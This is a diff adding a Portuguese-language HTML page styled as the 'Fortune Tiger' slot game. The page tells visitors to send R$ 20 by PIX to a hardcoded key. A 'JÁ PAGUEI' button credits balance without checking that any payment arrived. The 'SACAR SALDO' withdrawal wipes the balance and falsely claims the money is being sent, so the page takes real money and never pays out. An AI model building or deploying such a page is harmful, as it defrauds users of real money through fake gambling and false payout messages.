@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Fortune Tiger - Hard Mode</title>
+    <style>
+        body { background-color: #1a1a1a; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .slot-machine { background: linear-gradient(180deg, #ffcc00 0%, #d35400 100%); padding: 30px; border-radius: 25px; box-shadow: 0 15px 50px rgba(0,0,0,0.8); text-align: center; border: 4px solid #fff; width: 320px; }
+        .reels { display: flex; gap: 10px; background: #222; padding: 20px; border-radius: 15px; margin-bottom: 20px; justify-content: center; }
+        .reel { width: 70px; height: 70px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 45px; color: #000; transition: 0.1s; }
+        button { padding: 12px; font-size: 16px; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; margin: 5px 0; width: 100%; }
+        
+        #spinBtn { background: #27ae60; color: white; }
+        #depositBtn { background: #2980b9; color: white; }
+        #withdrawBtn { background: #8e44ad; color: white; }
+        
+        .stats { margin-top: 15px; font-size: 24px; font-weight: bold; }
+        .msg { height: 25px; margin-bottom: 10px; font-weight: bold; color: #fff; text-shadow: 1px 1px 2px #000; }
+        
+        /* Modais */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 100; }
+        .modal-content { background: #fff; color: #333; padding: 25px; border-radius: 20px; text-align: center; width: 80%; max-width: 320px; }
+        .pix-box { background: #f8f9fa; border: 2px dashed #d35400; padding: 10px; margin: 10px 0; font-weight: bold; font-size: 14px; }
+        .btn-nubank { background: #8a05be; color: white; }
+        .btn-bradesco { background: #cc092f; color: white; }
+    </style>
+</head>
+<body>
+
+    <div id="msg" class="msg">Tente a sorte!</div>
+    <div class="slot-machine">
+        <div class="reels">
+            <div id="reel1" class="reel">🐯</div>
+            <div id="reel2" class="reel">🐯</div>
+            <div id="reel3" class="reel">🐯</div>
+        </div>
+
+        <button id="spinBtn" onclick="spin()">GIRAR (R$ 10)</button>
+        <button id="depositBtn" onclick="openModal('pixModal')">DEPOSITAR</button>
+        <button id="withdrawBtn" onclick="openModal('withdrawModal')">SACAR SALDO</button>
+
+        <div class="stats">Saldo: R$ <span id="balance">0</span></div>
+    </div>
+
+    <div id="pixModal" class="modal">
+        <div class="modal-content">
+            <h3>Depósito PIX</h3>
+            <p>Envie <b>R$ 20,00</b> para:</p>
+            <div class="pix-box">16981280975</div>
+            <button style="background:#f1c40f; color: black;" onclick="copyPix()">COPIAR CHAVE</button>
+            <button class="btn-nubank" onclick="openBank('nubank')">Abrir Nubank</button>
+            <button class="btn-bradesco" onclick="openBank('bradesco')">Abrir Bradesco</button>
+            <button style="background:#27ae60; color:white" onclick="addBalance(20)">JÁ PAGUEI (R$ 20)</button>
+            <button style="background:#95a5a6; color:white" onclick="closeModal('pixModal')">FECHAR</button>
+        </div>
+    </div>
+
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h3>Sacar para Conta</h3>
+            <p>O saldo será enviado para a chave:</p>
+            <div class="pix-box">16981280975</div>
+            <p>Valor disponível: <b>R$ <span id="withdrawVal">0</span></b></p>
+            <button style="background:#27ae60; color:white" onclick="confirmWithdraw()">CONFIRMAR SAQUE</button>
+            <button style="background:#95a5a6; color:white" onclick="closeModal('withdrawModal')">CANCELAR</button>
+        </div>
+    </div>
+
+    <script>
+        const weightedSymbols = ['🍎','🍎','🍎','🍎','🍎','🍎','🍎','🔔','🔔','🔔','🔔','🔔','💎','💎','💎','💰','💰','🐯'];
+        let balance = 0;
+        const msg = document.getElementById('msg');
+
+        function openModal(id) { 
+            document.getElementById(id).style.display = 'flex'; 
+            if(id === 'withdrawModal') document.getElementById('withdrawVal').innerText = balance;
+        }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        
+        function copyPix() { 
+            navigator.clipboard.writeText("16981280975"); 
+            alert("Chave copiada!"); 
+        }
+
+        function openBank(type) {
+            window.location.href = type === 'nubank' ? "nubank://" : "bradesco://";
+            setTimeout(() => alert("Abra o app manualmente se não iniciou."), 500);
+        }
+
+        function addBalance(val) { 
+            balance += val; 
+            updateUI(); 
+            closeModal('pixModal'); 
+            msg.innerText = "Recebido R$ " + val;
+        }
+
+        function confirmWithdraw() {
+            if(balance <= 0) { alert("Sem saldo para sacar!"); return; }
+            alert("Solicitação enviada! R$ " + balance + " será enviado para sua conta.");
+            balance = 0;
+            updateUI();
+            closeModal('withdrawModal');
+        }
+
+        function getRandom() { return weightedSymbols[Math.floor(Math.random() * weightedSymbols.length)]; }
+
+        function spin() {
+            if (balance < 10) { alert("Deposite pelo menos R$ 10!"); return; }
+            balance -= 10;
+            updateUI();
+            msg.innerText = "Girando...";
+            let count = 0;
+            const timer = setInterval(() => {
+                document.getElementById('reel1').innerText = getRandom();
+                document.getElementById('reel2').innerText = getRandom();
+                document.getElementById('reel3').innerText = getRandom();
+                if(++count > 12) { clearInterval(timer); checkWin(); }
+            }, 80);
+        }
+
+        function checkWin() {
+            const r = [document.getElementById('reel1').innerText, document.getElementById('reel2').innerText, document.getElementById('reel3').innerText];
+            if (r[0] === r[1] && r[1] === r[2]) {
+                let win = (r[0] === '🐯') ? 200 : 50;
+                balance += win;
+                msg.innerText = `JACKPOT! +R$ ${win}`;
+            } else {
+                msg.innerText = "Você perdeu R$ 10. Tente de novo!";
+            }
+            updateUI();
+        }
+
+        function updateUI() { document.getElementById('balance').innerText = balance; }
+    </script>
+</body>
+</html>
